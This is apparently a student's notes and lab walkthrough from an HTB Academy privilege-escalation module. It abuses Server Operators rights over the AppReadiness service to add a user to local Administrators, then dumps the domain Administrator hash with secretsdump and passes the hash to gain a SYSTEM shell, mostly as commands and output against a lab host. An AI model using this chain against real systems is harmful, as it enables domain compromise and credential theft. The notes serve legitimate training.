# Server Operators

https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators

The Server Operators group allows members to administer Windows servers without needing assignment of Domain Admin privileges.

--> Membership of this group confers the powerful SeBackupPrivilege and SeRestorePrivilege privileges 

1) Querying the AppReadiness Service

```
sc qc AppReadiness

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

2) Checking Service Permissions with PsService

```
c:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All
```

3) Checking Local Admin Group Membership

```
net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.
```

4) Modifying the Service Binary Path

```
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS
```

5) Starting the Service

```
sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

6) Confirming Local Admin Group Membership

```
net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.
```

7) Confirming Local Admin Access on Domain Controller

```
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'

SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
```

8) Retrieving NTLM Password Hashes from the Domain Controller

```
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
Administrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a
Administrator:des-cbc-md5:d60dfbbf20548938
[*] Cleaning up...
```

## LAB

xfreerdp /v:10.129.43.42 /u:server_adm /p:HTB_@cademy_stdnt!

CMD run as administrator

C:\Users\server_adm>type c:\Users\Administrator\Desktop\ServerOperators\flag.txt
Access is denied.

1)
C:\Users\server_adm>sc qc AppReadiness
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

2)        
C:\Users\server_adm>c:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All

3)

C:\Users\server_adm>net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.

4) 

C:\Users\server_adm>sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
[SC] ChangeServiceConfig SUCCESS

5)

C:\Users\server_adm>sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
[SC] ChangeServiceConfig SUCCESS

C:\Users\server_adm>sc start AppReadiness
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

6)

C:\Users\server_adm>net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.


C:\Users\server_adm>type c:\Users\Administrator\Desktop\ServerOperators\flag.txt
Access is denied.

7)

crackmapexec smb 10.129.43.42 -u server_adm -p 'HTB_@cademy_stdnt!'

[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing FTP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing WINRM protocol database
[*] Initializing LDAP protocol database
[*] Initializing RDP protocol database
[*] Initializing SSH protocol database
[*] Initializing SMB protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.129.43.42    445    WINLPE-DC01      [*] Windows 10.0 Build 17763 x64 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.43.42    445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)

8)

secretsdump.py server_adm@10.129.43.42 -just-dc-user administrator
HTB_@cademy_stdnt!

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f220c24907b50fe1666a8227013389f60c775440806853065f80d9ecbe5a4a18
Administrator:aes128-cts-hmac-sha1-96:9f9f3c7d7a4db1dc88197c0b00b444f9
Administrator:des-cbc-md5:a7fe6bceb9975107

impacket-psexec administrator@10.129.43.42 -hashes :7796ee39fd3a9c3a1844556115ae1a54

C:\Windows\system32>type c:\Users\Administrator\Desktop\ServerOperators\flag.txt
S3rver_0perators_@ll_p0werfull!

--> Other method for pass-the-hash :
crackmapexec smb 10.129.43.42 -u Administrator -d . -H 7796ee39fd3a9c3a1844556115ae1a54